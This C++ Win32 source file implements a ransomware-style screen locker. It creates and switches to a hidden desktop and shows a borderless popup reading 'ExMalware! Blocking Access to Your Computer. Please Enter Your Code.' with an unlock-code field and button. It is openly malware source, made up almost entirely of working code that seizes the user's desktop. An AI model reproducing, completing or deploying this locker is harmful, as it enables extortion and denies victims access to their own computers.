#include  "windows.h"
#include "desktop.h"
#include "winlock.h"
#include "resource.h"
#include <iostream>
//https://msdn.microsoft.com/en-gb/library/windows/desktop/ms644996(v=vs.85).aspx




bool WnBlock::_getCriticalData(DlgData* cData)
{


	ZeroMemory(cData, sizeof(DlgData));

	cData->hInstance = HINSTANCE(::GetModuleHandleW(nullptr));
	cData->hPrevInstance = HINSTANCE(nullptr);

	if (cData->hInstance == NULL || cData->hPrevInstance != NULL) return false;

	::STARTUPINFOW startupInfo;

	GetStartupInfoW(&startupInfo);
	if ((startupInfo.dwFlags & STARTF_USESHOWWINDOW) != 0) cData->nCmdShow = startupInfo.wShowWindow;
	else cData->nCmdShow = SW_SHOWNORMAL;

	*cData->szWindowClass = { 'L' };

	return true;
}

LRESULT __stdcall WnBlock::WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId;
	int wmEvent;
	PAINTSTRUCT ps;
	HWND hWndButton;
	HWND hEdit;
	HGDIOBJ hfDefault;
	LONG style;
	HDC hdc;
	switch (message)
	{

	case WM_CREATE:
		hfDefault = GetStockObject(SYSTEM_FONT);
		 // Create a push button
		  hWndButton = CreateWindowEx(NULL,
			L"BUTTON",
			L"Unlock Me",
			WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
			218, 284, 149, 41,
			 hWnd,
			 (HMENU)IDC_BUTTON1,
			 GetModuleHandle(NULL),
			 NULL);
	
		SendMessage(hWndButton, WM_SETFONT,(WPARAM)hfDefault, MAKELPARAM(FALSE, 0));

		hEdit = CreateWindowEx(WS_EX_CLIENTEDGE,
			L"EDIT",
			L"Unlock code",
			WS_VISIBLE | WS_CHILD | WS_TABSTOP | WS_BORDER | ES_AUTOHSCROLL | ES_PASSWORD,
			75, 244, 293, 29,
			hWnd,
			(HMENU)IDC_EDIT1,
			GetModuleHandle(NULL),
			NULL);
		break;

	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		{
			RECT clientRect;
			GetClientRect(hWnd, &clientRect);
			// HGDIOBJ objects obtained from GetStockObject do not need to be deleted with DeleteObject as per the documentation: https://msdn.microsoft.com/en-us/library/dd144925(v=vs.85).aspx
			HGDIOBJ whiteBrushGDIObj = GetStockObject(WHITE_BRUSH);
			if (whiteBrushGDIObj == nullptr || GetObjectType(whiteBrushGDIObj) != OBJ_BRUSH) {
				PostQuitMessage(1);
			}
			else {
				HBRUSH whiteBrush = static_cast<HBRUSH>(whiteBrushGDIObj);
				FillRect(hdc, &clientRect, whiteBrush);
				COLORREF blackTextColor = 0x00000000;
				if (SetTextColor(hdc, blackTextColor) == CLR_INVALID) {
					PostQuitMessage(1);
				}
				else {
					const wchar_t helloWorldString[] = L"\r\n\r\nExMalware! Blocking Access to Your Computer. \r\n\r\n  \r\n\r\n Please Enter Your Code.";
					DrawTextW(hdc, helloWorldString, ARRAYSIZE(helloWorldString), &clientRect, DT_TOP | DT_CENTER  | DT_NOCLIP | DT_WORDBREAK);
				}
			}
		}


		EndPaint(hWnd, &ps);

	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}

	return  false;
}


WORD WnBlock::_registerClass(DlgData *dlgData)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = dlgData->hInstance;
	wcex.hIcon = LoadIcon(0, (LPCTSTR)IDI_APPLICATION);;
	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = MAKEINTRESOURCE(IDD_OLE_PROPPAGE_LARGE);
	wcex.lpszClassName = dlgData->szWindowClass;
	wcex.hIconSm = NULL;
	return RegisterClassEx(&wcex);
}

BOOL WnBlock::createInstance(DlgData *dlgData)
{
	HWND hWnd;
	
	hWnd = CreateWindowW(
		dlgData->szWindowClass,
		L"HELLOs",
		WS_VISIBLE | WS_POPUP
		,
		500,
		0,
		500,
		500,
		NULL,
		NULL,
		dlgData->hInstance,
		NULL);

	if (!hWnd)return FALSE;



	SetActiveWindow(hWnd);
	ShowWindow(hWnd, dlgData->nCmdShow);
	UpdateWindow(hWnd);

	return  TRUE;
}

DWORD WnBlock::DialText()
{
	DlgData criticalData;
	MSG msg;
	_getCriticalData(&criticalData);
	_registerClass(&criticalData);
	if(!createInstance(&criticalData)) return false;

	while (GetMessageW(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}


	return (int)msg.wParam;
}

DWORD WnBlock::lockWingui(LPVOID lparam)
{
	DlgData *criticalData = (DlgData*)lparam;
	SetThreadDesktop(criticalData->TreadToLockDesktop);

	MSG msg;
	if (!_registerClass(criticalData))
	{

	}

	if (!createInstance(criticalData)) return false;

	while (GetMessageW(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}


	return (int)msg.wParam;
}

bool WnBlock::lockWindows()
{


	//DialText();

	
	DWORD tid;
	DlgData criticalData;
	DesktopLocker lockDesk;
	DesktopEnv::_createHiddenDesktop(&lockDesk);
	criticalData.TreadToLockDesktop = lockDesk.lockDesktop;
	FreeConsole();
	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lockWingui, &criticalData, 0, &tid);
	SwitchDesktop(lockDesk.lockDesktop);
	WaitForSingleObject(hThread, INFINITE);
	SwitchDesktop(lockDesk.originalDesktop);


	/*

	DesktopLocker lockDesk;

	SwitchDesktop(lockDesk.lockDesktop);
	//WaitForSingleObject(hThread, INFINITE);
	Sleep(10000);
	SwitchDesktop(lockDesk.originalDesktop);
	*/



	return true;
}
